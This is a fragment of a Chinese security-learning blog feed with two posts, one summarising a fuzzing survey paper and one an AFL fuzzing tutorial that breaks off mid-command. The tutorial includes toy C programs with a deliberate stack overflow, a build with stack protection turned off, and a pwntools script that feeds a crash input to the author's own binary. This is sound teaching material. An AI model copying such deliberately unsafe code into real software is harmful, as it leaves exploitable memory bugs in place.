PRO-GRAMS"></a>SYSTEMIZATION, TAXONOMY, AND TEST PRO-GRAMS</h1><p>介绍了模糊测试最开始的提出者以及其最开始的定义 列举了模糊测试可适用的领域 接着为了使得大量模糊测试文献中的用语系统化 作者决定介绍一个由现代用途中提取的术语</p><h2 id="1-Fuzzing-Fuzz-Testing"><a href="#1-Fuzzing-Fuzz-Testing" class="headerlink" title="1.Fuzzing &amp; Fuzz Testing"></a>1.Fuzzing &amp; Fuzz Testing</h2><p>本小节针对模糊测试下了第一个定义</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Definition 1 (Fuzzing). Fuzzing is the execution of the PUTusing input(s) sampled from an input space (the “fuzz inputspace”) that protrudes the expected input space of the PUT.</span><br><span class="line">这里的put是program under test</span><br></pre></td></tr></table></figure><p>此外还针对fuzz testing和fuzz进行了一个定义<br>作者认为fuzz testing是一种利用fuzz的软件测试技术 其的特定目标是用来查找和安全有关的错误 包括程序崩溃</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Definition 2 (Fuzz Testing). Fuzz testing is the use of fuzzing</span><br><span class="line">to test if a PUT violates a security policy.</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Definition 3 (Fuzzer). A fuzzer is a program that performs</span><br><span class="line">fuzz testing on a PUT.</span><br></pre></td></tr></table></figure><p>此外还定义了fuzz compaign</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Definition 4 (Fuzz Campaign). A fuzz campaign is a specific</span><br><span class="line">execution of a fuzzer on a PUT with a specific security</span><br><span class="line">policy.</span><br></pre></td></tr></table></figure><p>早期的模糊测试活动 其安全策略只局限于测试输入 使PUT崩溃 但是模糊测试活动可以用于测试执行中观察到的任何安全策略 而这一决定执行是否违反安全策略的称为漏洞预测器</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Definition 5 (Bug Oracle). A bug oracle is a program, per-</span><br><span class="line">haps as part of a fuzzer, that determines whether a given</span><br><span class="line">execution of the PUT violates a specific security policy.</span><br></pre></td></tr></table></figure><p>这一段话有点没看懂 目前还不能理解执行中观察到的任何安全策略的含义 除了输入点可以诱发的崩溃 还有什么呢 笔者于这里提出了第一个疑问<br>作者称由模糊器实现的算法为模糊算法 模糊参数是依赖于PUT之外的一些参数 称其为模糊配置 笔者这里将其理解为 模糊参数于PUT不相干 是否可以认为是一种用于模糊测试的语料库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Definition 6 (Fuzz Configuration). A fuzz configuration of</span><br><span class="line">a fuzz algorithm comprises the parameter value(s) that</span><br><span class="line">control(s) the fuzz algorithm.</span><br></pre></td></tr></table></figure><p>接着针对模糊算法进行了进一步的说明 作者认为模糊算法的定义是广泛的 复杂的模糊配置会随着时间的推移而演变其算法 引入了突变率和种子的概念<br>种子是用来生成输入PUT的测试用例<br>而种子的集合则成为种子池 复杂的模糊配置就会演变种子池<br>作者举了一个基于覆盖率引导的模糊测试例子 其会在每个配置中存储已经达到的覆盖率信息<br>笔者这里经过查阅资料(其实是询问gpt 大致了解了覆盖率是一种什么概念<br>覆盖率引导是一种模糊测试的技术策略 其主要目的是用来寻找最优的测试用例 该测试用例可以经过最多的代码分支 经过的代码占总代码的百分比就是覆盖率<br>那么这里就是一种迭代的过程 会根据上一次的模糊测试返回的覆盖率 来决定下一次的种子 从而使其获得更大的覆盖率</p><h2 id="2-Paper-Selection-Criteria"><a href="#2-Paper-Selection-Criteria" class="headerlink" title="2.Paper Selection Criteria"></a>2.Paper Selection Criteria</h2><p>这一小节 主要是作者声明了收纳出版物的范围 举了几个会议的名称<br>同时引入了黑盒白盒的概念(并未由作者提出 为笔者根据段落大意可以看出)<br>作者认为 以安全为特定目标的模糊测试和软件测试相比 从理论来说 二者的不同点只体现在漏洞预测器的区别(bug oracle)<br>接着作者提到 在实际中 软件测试的前提是知晓源代码 而且测试人对于PUT有更多的了解<br>而模糊测试更可能是被PUT开发者以外的人使用 其不知晓上述信息<br>由于这二者领域仍然密切相关 所以作者决定 只要出版物出现模糊(fuzz)一次 就纳入其中</p><h2 id="3-Fuzz-Testing-Algorithm"><a href="#3-Fuzz-Testing-Algorithm" class="headerlink" title="3.Fuzz Testing Algorithm"></a>3.Fuzz Testing Algorithm</h2><p>本节作者提供了一个算法1<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310192020010.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310192020010.png" alt="image.png"></a><br>其采用一组模糊配置C以及Tlimit(最大时间限制)作为输入<br>输出一组已发现的错误<br>其由两部分组成 第一部分为预处理(preprocess)函数构成 该函数在模糊测试开始时执行<br>第二部分为由五个功能组成的循环 但不是所有的模糊器都全是这五个功能<br>称这个循环的每次运行为模糊迭代 每次inputeval将模糊样例输入给PUT称为模糊运行</p><h3 id="PREPROCESS-C-C"><a href="#PREPROCESS-C-C" class="headerlink" title="PREPROCESS(C)-&gt;C"></a>PREPROCESS(C)-&gt;C</h3><p>用户向P提供一组模糊配置 其可能返回一组已修改的模糊配置<br>根据模糊算法的不同 P可以执行各种各样的操作 比如插入测试代码到PUT中<br>或者测量种子文件的执行速度</p><h3 id="SCHEDULE-C-Telapsed-Tlimit-conf"><a href="#SCHEDULE-C-Telapsed-Tlimit-conf" class="headerlink" title="SCHEDULE(C,Telapsed,Tlimit)-&gt;conf"></a>SCHEDULE(C,Telapsed,Tlimit)-&gt;conf</h3><p>将一组模糊配置C 最大时间限制 经过的时间作为参数输入 其会返回一个用于当前模糊迭代的模糊配置<br>这句话笔者有点没看懂 是意味着该功能负责实现模糊配置的迭代?<br>不过作者说详细看2.4节 所以这里暂且留一个疑问</p><h3 id="INPUTGEN-conf-tcs"><a href="#INPUTGEN-conf-tcs" class="headerlink" title="INPUTGEN(conf)-&gt;tcs"></a>INPUTGEN(conf)-&gt;tcs</h3><p>这个功能输入一个当前模糊配置 根据模糊器的不同 会选择模糊配置中的种子 又或者是模型或语法作为参数 以此来输出模糊测试的样例<br>笔者这里对于模型和语法是什么东西 还没有概念 先继续往下看</p><h3 id="INPUTEVAL-conf-tcs-0bug-B-execinfos"><a href="#INPUTEVAL-conf-tcs-0bug-B-execinfos" class="headerlink" title="INPUTEVAL(conf,tcs,0bug)-&gt;B,execinfos"></a>INPUTEVAL(conf,tcs,0bug)-&gt;B,execinfos</h3><p>接收当前模糊配置conf 模糊测试样例 以及漏洞预测器作为参数<br>该功能用于判断PUT是否违反了安全策略<br>结束后会输出一个漏洞合集B 以及execinfos 用来迭代模糊配置</p><h3 id="CONFUPDATE-C-conf-execinfos-C"><a href="#CONFUPDATE-C-conf-execinfos-C" class="headerlink" title="CONFUPDATE(C,conf,execinfos)-&gt;C"></a>CONFUPDATE(C,conf,execinfos)-&gt;C</h3><p>接收模糊配置C 当前模糊配置conf execinfos作为参数<br>该功能用来更新模糊配置C</p><h3 id="CONTINUE-C-True-False"><a href="#CONTINUE-C-True-False" class="headerlink" title="CONTINUE(C)-&gt;{True,False}"></a>CONTINUE(C)-&gt;{True,False}</h3><p>该功能用来接收当前模糊配置 并且进行判断是否进行模糊迭代<br>如果没有新的路径可发现 其就可以终止执行</p><h2 id="4-Taxonomy-of-Fuzzers"><a href="#4-Taxonomy-of-Fuzzers" class="headerlink" title="4.Taxonomy of Fuzzers"></a>4.Taxonomy of Fuzzers</h2><p>本节 作者对于模糊器的分类进行了定义 分为了三种 黑盒 白盒 灰盒<br>同时 这与传统的软件测试分类不同 灰盒是作为白盒的变体</p><h3 id="Black-box-Fuzzer"><a href="#Black-box-Fuzzer" class="headerlink" title="Black-box Fuzzer"></a>Black-box Fuzzer</h3><p>黑盒适用于模糊测试以及软件测试中 表示测试者无法看到PUT的内部结构 只能看到PUT的输入输出 大部分的模糊器都属于这一类<br>现代的部分模糊器 在考虑输入的结构信息以此来生成更有意义的测试样例的同时 也会保证不检查PUT</p><h3 id="White-box-Fuzzer"><a href="#White-box-Fuzzer" class="headerlink" title="White-box Fuzzer"></a>White-box Fuzzer</h3><p>白盒测试是指在进行模糊测试的时候 已经了解了PUT的内部结构和逻辑<br>接着作者提到 白盒测试一词最早的提及是动态符号执行DSE<br>普通的符号执行是指利用符号值而非输入值来分析执行路径<br>而动态符号执行中 符号执行和具体执行路径同时运行 根据PUT的状态和具体输入的数据来简化符号约束条件<br>在简化符号约束条件中 可以将符号值转化为具体的值 例如将符号执行的系统调用转化为实际的系统调用<br>上述的符号值表示的概念 按笔者的理解 应该是用例如符号’a’这样的字符来代替具体的值例如’6’ 类似于数学中一元方程的x<br>随后 作者还提到 白盒测试通常来用来描述污点分析的模糊器<br>笔者查询得知 污点分析中的污点是指不受信任的输入源进入PUT的数据 通常是用户输入<br>通过模糊器生成污点数据 可以模拟潜在的攻击场景 检测PUT是否在处理污点数据的时候存在安全隐患<br>作者提到 由于白盒测试需要进行动态检测和smt求解 所以相比黑盒测试 所需要的开销会更多</p><h3 id="Grey-box-Fuzzer"><a href="#Grey-box-Fuzzer" class="headerlink" title="Grey-box Fuzzer"></a>Grey-box Fuzzer</h3><p>灰盒测试位于白盒和黑盒之间  模糊器可以获得PUT的一部分内部信息<br>与白盒模糊器相比 灰盒不会推理PUT的完整语义<br>笔者认为 这里的完整语义是指 PUT的内部逻辑 数据流 控制流以及外部的交互等等<br>作者提到 灰盒测试可以对PUT进行轻量的静态分析或者收集其执行的动态信息 比如代码覆盖率</p><h2 id="5-Fuzzer-Genealogy-and-Overview"><a href="#5-Fuzzer-Genealogy-and-Overview" class="headerlink" title="5.Fuzzer Genealogy and Overview"></a>5.Fuzzer Genealogy and Overview</h2><p>暂时看不下去了 断更。。。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="extra" scheme="http://example.com/categories/extra/"/>
    
    
  </entry>
  
  <entry>
    <title>FUZZ学习</title>
    <link href="http://example.com/2023/10/17/fuzz%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2023/10/17/fuzz%E5%AD%A6%E4%B9%A0/</id>
    <published>2023-10-17T08:37:27.000Z</published>
    <updated>2023-11-20T02:59:52.151Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>对于FUZZ的大名早有耳闻 今天终于开始正式学习这一知识<br>水平有限 本篇文章可能部分地方存在描述错误等问题<br>本篇文章使用AFL模糊器</p><h1 id="什么是FUZZ"><a href="#什么是FUZZ" class="headerlink" title="什么是FUZZ"></a>什么是FUZZ</h1><p>为了弄清楚FUZZ的概念 拜读了《Fuzzing: Art, Science, and Engineering》这篇经典的论文 如果有想看我阅读后总结的 可以去看另外一篇博客 这里就简单概述<br>FUZZ相比传统的软件测试 其包含的漏洞预测器用于决定测试过程中是否违反了安全策略<br>二者的目的性不一样 而FUZZ又分为三种 白盒 黑盒 灰盒 三者最大的差别在于模糊器对于PUT(待测程序)的了解程度有多少 是否知晓PUT的内部逻辑等<br>FUZZ采用模糊算法来生成随机的测试样例 部分复杂的模糊配置可以演变种子池来迭代测试样例 通常依靠代码覆盖率(即PUT执行路径)</p><h1 id="配置FUZZ环境"><a href="#配置FUZZ环境" class="headerlink" title="配置FUZZ环境"></a>配置FUZZ环境</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz</span><br><span class="line">tar xvf afl-latest.tgz</span><br><span class="line">cd afl-2.52b</span><br><span class="line">sudo make &amp;&amp; sudo make install</span><br></pre></td></tr></table></figure><p>上述是afl的安装 我个人建议是使用afl++ 不过本篇文章均采用afl<br>同时上述方式安装的afl版本是2.52 实际上最新的版本为2.57 需要去github上下载源代码后make编译 这里看各位的需求</p><h1 id="第一次FUZZ"><a href="#第一次FUZZ" class="headerlink" title="第一次FUZZ"></a>第一次FUZZ</h1><p>我们先来自己编写一个程序 逻辑很简单 输入对应的字符串就触发段错误</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">    char buf[100];</span><br><span class="line">    scanf(&quot;%s&quot;,buf);</span><br><span class="line">    char buf1[] = &quot;aaaa&quot;;</span><br><span class="line">    if(!strcmp(buf,buf1))&#123;</span><br><span class="line">        printf(&quot;success!\n&quot;);</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        printf(&quot;faile\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随便创建两个空目录 一个用来存放测试样例  一个用来存放输出信息<br>本次模糊测试 测试样例由我们自己填写<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242045496.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242045496.png" alt="image.png"></a><br>随后使用-i指定前者 -o指定后者 开始fuzz</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">afl-fuzz -i ./fuzz/in -o ./fuzz/out ./test</span><br></pre></td></tr></table></figure><p>当然了 如果你使用的是afl 那么你就会发现 模糊器读取到第二个样例的时候就终止了<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242047047.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242047047.png" alt="image.png"></a><br>原因在于afl的测试样例貌似不能直接导致PUT触发crash<br>所以这里更改第二个样例 使其为aaa 让模糊器使其迭代 延伸成aaaa这个字符串<br>随后重新开始fuzz 发现成功找到了三个crash<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242131457.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242131457.png" alt="image.png"></a></p><p>看到官方文档说 如果要让模糊器运行完毕 需要几个小时到一周左右 所以这里直接ctrl+c终止了<br>官方文档提到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crashes/ - unique test cases that cause the tested program to receive a fatal signal (e.g., SIGSEGV, SIGILL, SIGABRT). The entries are grouped by the received signal.</span><br></pre></td></tr></table></figure><p>所以去crashes目录下找到了三个触发崩溃的样例<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242131539.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242131539.png" alt="image.png"></a><br>第一个不出所料 是我们原定的字符串aaaa 第二个和第三个有点意外 貌似也是一些无规则字节 打算动调来看看 利用hexdump获取一下16进制格式的ascii字节码<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242151963.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242151963.png" alt="image.png"></a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\x68\x68\x68\x68\x32\x00\x00\x68\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xCE\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\x68\x87\x68\xE8\x00\x10\x68\x7F\xFF\xF0\xF0\xF0\xF0\xF0\xCF\xF0\xF0\xF0\xE4\xF0\xF0\xF0\x70\xF0\x68\x68\x68\x68\x32\x68\x68\x68\x68\x68\x68\xE8\x68\x68\x68\x68\xF0\xF0\xF0\xF0\xF0\xF0\xCF\xF0\xF0\xF0\xF0\x68\x68\xF0\xE9\xF0\xF0\xFB\xF0\xCF\xF0\xF0\xF0\xF0\xF0\xF0\x07\x70\xF0\x68\x68\x68\x68\x68\x68\x68\x6E\x00\x00\x01\x00\x70\xF0\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\xDF\xD1</span><br></pre></td></tr></table></figure><p>调试exp:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">io = process(&quot;./test&quot;)</span><br><span class="line">elf = ELF(&quot;./test&quot;)</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = &quot;\x68\x68\x68\x68\x32\x00\x00\x68\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xCE\xC6\xC6\xC6\xC6\xC6\xC6\xC6\xC6\x68\x87\x68\xE8\x00\x10\x68\x7F\xFF\xF0\xF0\xF0\xF0\xF0\xCF\xF0\xF0\xF0\xE4\xF0\xF0\xF0\x70\xF0\x68\x68\x68\x68\x32\x68\x68\x68\x68\x68\x68\xE8\x68\x68\x68\x68\xF0\xF0\xF0\xF0\xF0\xF0\xCF\xF0\xF0\xF0\xF0\x68\x68\xF0\xE9\xF0\xF0\xFB\xF0\xCF\xF0\xF0\xF0\xF0\xF0\xF0\x07\x70\xF0\x68\x68\x68\x68\x68\x68\x68\x6E\x00\x00\x01\x00\x70\xF0\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\xDF\xD1&quot;</span><br><span class="line">gdb.attach(io,&#x27;b *$rebase(0x1244)&#x27;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure><p>在程序执行到pthread_kill函数后 回溯一下执行流 发现了检查canary的函数<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242207740.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242207740.png" alt="image.png"></a><br>应该是由于栈溢出触发的crash<br>那么接下来来看第三个<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242208078.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310242208078.png" alt="image.png"></a><br>看这个长度应该也是因为栈溢出导致的crash 那么这里就不进一步动调了</p><h1 id="黑盒测试以及读取文件内容"><a href="#黑盒测试以及读取文件内容" class="headerlink" title="黑盒测试以及读取文件内容"></a>黑盒测试以及读取文件内容</h1><p>本小节用来记录自己对于afl官方文档阅读后的理解和实操  没啥重要性<br>文档中粗略介绍了afl所采用的模糊算法<br>总结一下 可以得到下图<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310251248485.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310251248485.png" alt="image.png"></a><br>大体是和论文中描述的模糊器的五个功能大差不差<br>随后想要研究一下afl的黑盒测试功能  然后在配置环境的时候 不得不说是真的遇到一堆报错<br>首先进入下载的afl源码目录中的qemu-mode目录 运行build_qemu_support.sh</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd qemu-mode</span><br><span class="line">./build_qemu_support.sh</span><br></pre></td></tr></table></figure><p>这里我首先遇到的是下载qemu的网址报错404 但是也不是虚拟机代理问题 我宿主机也访问不到<br>进入build文件中 找到对应代码的位置<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310251445451.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310251445451.png" alt="image.png"></a><br>将QEMU_URL更改为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://download.qemu.org/qemu-$&#123;VERSION&#125;.tar.xz</span><br></pre></td></tr></table></figure><p>随后就可以正常下载了 接下来遇到的问题是其默认使用的是python 需求是python2<br>所以还需要加一个软连接 使python可以指向python2</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ln -s /usr/bin/python2.7 /usr/bin/python</span><br></pre></td></tr></table></figure><p>随后虽然可以正常执行一段时间 最后还是遇到了一个报错<br><strong>&#x2F;home&#x2F;chen&#x2F;AFL&#x2F;qemu_mode&#x2F;qemu-2.10.0&#x2F;linux-user&#x2F;syscall.c:261:16: error: static declaration of ‘gettid’ follows non-static declaration</strong><br>找到qemu-mode中的patches目录 更改syscall.diff文件内容为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--- qemu-2.10.0-clean/linux-user/syscall.c    2020-03-12 18:47:47.898592169 +0100</span><br><span class="line">+++ qemu-2.10.0/linux-user/syscall.c    2020-03-12 19:16:41.563074307 +0100</span><br><span class="line">@@ -34,6 +34,7 @@</span><br><span class="line"> #include &lt;sys/resource.h&gt;</span><br><span class="line"> #include &lt;sys/swap.h&gt;</span><br><span class="line"> #include &lt;linux/capability.h&gt;</span><br><span class="line">+#include &lt;linux/sockios.h&gt; // https://lkml.org/lkml/2019/6/3/988</span><br><span class="line"> #include &lt;sched.h&gt;</span><br><span class="line"> #include &lt;sys/timex.h&gt;</span><br><span class="line"> #ifdef __ia64__</span><br><span class="line">@@ -116,6 +117,8 @@ int __clone2(int (*fn)(void *), void *ch</span><br><span class="line"> #include &quot;qemu.h&quot;</span><br><span class="line"> </span><br><span class="line">+extern unsigned int afl_forksrv_pid;</span><br><span class="line">+</span><br><span class="line"> #ifndef CLONE_IO</span><br><span class="line"> #define CLONE_IO                0x80000000      /* Clone io context */</span><br><span class="line"> #endif</span><br><span class="line"> </span><br><span class="line">@@ -256,7 +259,9 @@ static type name (type1 arg1,type2 arg2,</span><br><span class="line"> #endif</span><br><span class="line"> </span><br><span class="line"> #ifdef __NR_gettid</span><br><span class="line">-_syscall0(int, gettid)</span><br><span class="line">+// taken from https://patchwork.kernel.org/patch/10862231/</span><br><span class="line">+#define __NR_sys_gettid __NR_gettid</span><br><span class="line">+_syscall0(int, sys_gettid)</span><br><span class="line"> #else</span><br><span class="line"> /* This is a replacement for the host gettid() and must return a host</span><br><span class="line">    errno. */</span><br><span class="line">@@ -6219,7 +6224,8 @@ static void *clone_func(void *arg)</span><br><span class="line">     cpu = ENV_GET_CPU(env);</span><br><span class="line">     thread_cpu = cpu;</span><br><span class="line">     ts = (TaskState *)cpu-&gt;opaque;</span><br><span class="line">-    info-&gt;tid = gettid();</span><br><span class="line">+    // taken from https://patchwork.kernel.org/patch/10862231/</span><br><span class="line">+    info-&gt;tid = sys_gettid();</span><br><span class="line">     task_settid(ts);</span><br><span class="line">     if (info-&gt;child_tidptr)</span><br><span class="line">         put_user_u32(info-&gt;tid, info-&gt;child_tidptr);</span><br><span class="line">@@ -6363,9 +6369,11 @@ static int do_fork(CPUArchState *env, un</span><br><span class="line">                mapping.  We can&#x27;t repeat the spinlock hack used above because</span><br><span class="line">                the child process gets its own copy of the lock.  */</span><br><span class="line">             if (flags &amp; CLONE_CHILD_SETTID)</span><br><span class="line">-                put_user_u32(gettid(), child_tidptr);</span><br><span class="line">+                // taken from https://patchwork.kernel.org/patch/10862231/</span><br><span class="line">+                put_user_u32(sys_gettid(), child_tidptr);</span><br><span class="line">             if (flags &amp; CLONE_PARENT_SETTID)</span><br><span class="line">-                put_user_u32(gettid(), parent_tidptr);</span><br><span class="line">+                // taken from https://patchwork.kernel.org/patch/10862231/</span><br><span class="line">+                put_user_u32(sys_gettid(), parent_tidptr);</span><br><span class="line">             ts = (TaskState *)cpu-&gt;opaque;</span><br><span class="line">             if (flags &amp; CLONE_SETTLS)</span><br><span class="line">                 cpu_set_tls (env, newtls);</span><br><span class="line">@@ -11402,7 +11410,8 @@ abi_long do_syscall(void *cpu_env, int n</span><br><span class="line">         break;</span><br><span class="line"> #endif</span><br><span class="line">     case TARGET_NR_gettid:</span><br><span class="line">-        ret = get_errno(gettid());</span><br><span class="line">+        // taken from https://patchwork.kernel.org/patch/10862231/</span><br><span class="line">+        ret = get_errno(sys_gettid());</span><br><span class="line">         break;</span><br><span class="line"> #ifdef TARGET_NR_readahead</span><br><span class="line">     case TARGET_NR_readahead:</span><br></pre></td></tr></table></figure><p>随后成功完成环境配置<br>更多报错可以参考该文章: <a href="https://blog.csdn.net/qysh123/article/details/114792891?utm_term=aflqemu%E6%A8%A1%E5%BC%8F&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-0-114792891&spm=3001.4430">https://blog.csdn.net/qysh123/article/details/114792891?utm_term=aflqemu%E6%A8%A1%E5%BC%8F&amp;utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-0-114792891&amp;spm=3001.4430</a><br>但是随后我们尝试使用-Q选项开始模糊测试 但是发现其找不到afl-qemu-trace<br>只需要添加环境变量AFL_PATH为afl目录的路径即可<br>这里还是使用上述的PUT进行测试 不过是用gcc将其编译<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310251621751.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310251621751.png" alt="image.png"></a><br>成功获取到两个crash<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310251622415.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310251622415.png" alt="image.png"></a><br>不出所料 一个应该是canary导致的栈溢出 一个是因为我们既定的字符串触发的crash<br>接下来试着研究了下PUT输入样例的两个方式<br>一种是直接从stdin输入 像本篇文章一直使用的PUT那样<br>还有一种是从文件中输入 那么接下来就重写一个PUT来实现第二种<br>不过我们先来搞清楚第一种<br>官方文档中 记录的指令是这样</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./afl-fuzz -i testcase_dir -o findings_dir /path/to/program [...params...]</span><br></pre></td></tr></table></figure><p>[params]比较让我在意  这是否意味着不需要in目录? 可以直接从命令行输入测试样例<br>删除了in目录中的所有测试样例后 我想通过命令行向其传输aaa这个测试样例<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310251649438.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310251649438.png" alt="image.png"></a><br>结果还是失败了 那么为了验证 命令行输入的测试样例究竟是否起到了作用 接下来做一个小测试<br>第一组我们的测试样例中不包含aaa 同时不通过命令行输入测试样例<br>第二组我们的测试样例保持不变 通过命令行输入测试样例aaa<br>对比两组的测试结果 如果第二组的crash除了栈溢出之外 还变异出了aaa 而第一组没有 那么就可以证明测试样例成功输入进去<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310251653122.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310251653122.png" alt="image.png"></a><br>测试样例两个 内容分别如上图<br>第一组跑出的crash中不含有aaaa<br>第二组含有 那么可以证实测试样例确实是传入了<br>接下来研究一下从文件中写入的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">    int fd = open(&quot;flag&quot;,0);</span><br><span class="line">    char buf[0x20];</span><br><span class="line">    read(fd,buf,0x20);</span><br><span class="line">    char buf1[0x20] = &quot;aaaa&quot;;</span><br><span class="line">    if(!strcmp(buf,buf1))&#123;</span><br><span class="line">        puts(&quot;success!&quot;);</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        puts(&quot;error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译命令 这里考虑到了canary带来的crash太讨厌了  所以直接关掉了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">afl-gcc -o test1 -no-pie -fno-stack-protector -g ./test1.c</span><br></pre></td></tr></table></figure><p>本次提供给模糊器的测试样例就一个aaa<br>然后由于是从文件读取输入 并且你可以看到上面的代码 我们是指定了所需的文件名 同时目录应该是位于当前PUT下<br>所以我们除了使用@@标识当前使用文件输入外 还需要使用-f指定对应路径下的文件名<br>不过我试了下 把@@删了也是可以的 可能是-f就自动默认了?</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">afl-fuzz -i ./fuzz/in -o ./fuzz/out -f ./flag ./test1 @@</span><br></pre></td></tr></table></figure><p>成功找到一个crash<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310252233114.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310252233114.png" alt="image.png"></a><br>查看了内容 没错是我们预设的aaaa</p><h1 id="fuzz实际利用"><a href="#fuzz实际利用" class="headerlink" title="fuzz实际利用"></a>fuzz实际利用</h1><p>接下来准备尝试 使用fuzz来对一些开源的知名项目进行测试 以此来熟悉fuzz实际利用的操作<br>这里使用upx upx是一款可执行文件压缩工具 <a href="https://github.com/upx/upx#">https://github.com/upx/upx#</a><br>upx使用的压缩算法涉及到了ucl 所以还要先安装ucl</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir 